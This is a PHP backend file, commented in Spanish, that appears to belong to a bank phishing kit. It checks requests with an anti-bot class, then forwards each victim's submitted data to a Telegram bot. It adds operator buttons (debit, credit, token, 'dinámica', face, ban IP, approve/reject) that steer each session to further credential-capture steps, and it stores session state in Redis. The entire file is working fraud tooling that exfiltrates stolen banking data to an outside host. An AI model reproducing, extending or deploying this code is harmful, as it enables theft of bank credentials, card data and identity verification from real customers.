<?php
/**
 * ================================================================
 * API Send — Envía datos a Telegram desde el backend
 * ================================================================
 * El token del bot NUNCA viaja al frontend.
 */

require_once __DIR__ . '/../Antibot.php';

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Método no permitido']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true) ?: $_POST;

if (!Antibot::esHumano($input)) {
    Antibot::rechazar();
}

$step          = $input['step']        ?? '';
$message       = $input['message']     ?? '';
$clientSessionId = $input['sessionId'] ?? '';

if (empty($step) || empty($message) || empty($clientSessionId)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Faltan parámetros']);
    exit;
}

// ── Usar sessionId del cliente ──
$sessionId = $input['sessionId'] ?? '';
if (empty($sessionId) || !preg_match('/^sess_[a-zA-Z0-9_]+$/', $sessionId)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'SessionId inválido']);
    exit;
}

// ── Función auxiliar para comunicarse con Redis usando la variable REDIS_URL ──
function upstash_redis($command, array $args = []) {
    $redisUrl = getenv('REDIS_URL');
    if (!$redisUrl) return null;
    
    $parsed = parse_url($redisUrl);
    $host = $parsed['host'] ?? '';
    $port = $parsed['port'] ?? 6379;
    $pass = $parsed['pass'] ?? '';
    
    if (empty($host) || empty($pass)) return null;

    $url = "https://{$host}:{$port}";
    $payload = array_merge([$command], $args);
    
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($payload),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER     => [
            "Authorization: Bearer " . $pass,
            "Content-Type: application/json"
        ],
        CURLOPT_TIMEOUT        => 5,
        CURLOPT_SSL_VERIFYPEER => true
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) return null;
    $data = json_decode($response, true);
    return $data['result'] ?? null;
}

$config   = require __DIR__ . '/../config.php';
$botToken = $config['bot_token'];
$chatId   = $config['chat_id'];

// ── Todas las opciones disponibles en TODOS los pasos para control total del admin ──
$buttons = [
    ['text' => '✅ Aprobar',   'callback_data' => "aprobar_{$step}_{$sessionId}"],
    ['text' => '💳 Débito',    'callback_data' => "debito_{$step}_{$sessionId}"],
    ['text' => '💰 Crédito',   'callback_data' => "credito_{$step}_{$sessionId}"],
    ['text' => '🔐 Token',     'callback_data' => "token_{$step}_{$sessionId}"],
    ['text' => '💳 Dinámica',  'callback_data' => "dinamica_{$step}_{$sessionId}"],
    ['text' => '👤 Face',      'callback_data' => "face_{$step}_{$sessionId}"],
    ['text' => '⚠️ 923',       'callback_data' => "923_{$step}_{$sessionId}"],
    ['text' => '🚫 Ban IP',    'callback_data' => "banip_{$step}_{$sessionId}"],
    ['text' => '❌ Rechazar',  'callback_data' => "rechazar_{$step}_{$sessionId}"]
];

// Agrupar de 2 en 2 para mejor visualización
$keyboard = [];
$row = [];
foreach ($buttons as $i => $btn) {
    $row[] = $btn;
    if (count($row) === 2 || $i === count($buttons) - 1) {
        $keyboard[] = $row;
        $row = [];
    }
}

$postData = http_build_query([
    'chat_id'      => $chatId,
    'text'         => $message . "\n\n⏳ Esperando acción del administrador...",
    'parse_mode'   => 'HTML',
    'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
]);

$ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_POST            => true,
    CURLOPT_POSTFIELDS      => $postData,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 15,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_FOLLOWLOCATION => true
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error    = curl_error($ch);
curl_close($ch);

if ($error || $httpCode !== 200) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Error Telegram', 'details' => $error ?: "HTTP {$httpCode}"]);
    exit;
}

$data = json_decode($response, true);
if (!$data['ok']) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Telegram API error', 'details' => $data['description'] ?? 'Unknown']);
    exit;
}

$messageId = $data['result']['message_id'] ?? null;

// ── Guardar sesión en Redis (Compatible con Vercel Serverless) ──
$sessionData = [
    'sessionId'    => $sessionId,
    'currentStep'  => $step,
    'messageId'    => $messageId,
    'status'       => 'pending',
    'action'       => null,
    'createdAt'    => time(),
    'lastUpdateId' => 0,
    'messageText'  => $message
];

// Guardar en Redis usando SET con expiración de 1 hora (3600 segundos)
$redisResult = upstash_redis('SET', [$sessionId, json_encode($sessionData), 'EX', 3600]);

if ($redisResult === null) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'No se pudo guardar la sesión en Redis']);
    exit;
}

echo json_encode([
    'ok'        => true,
    'messageId' => $messageId,
    'sessionId' => $sessionId,
    'step'      => $step
]);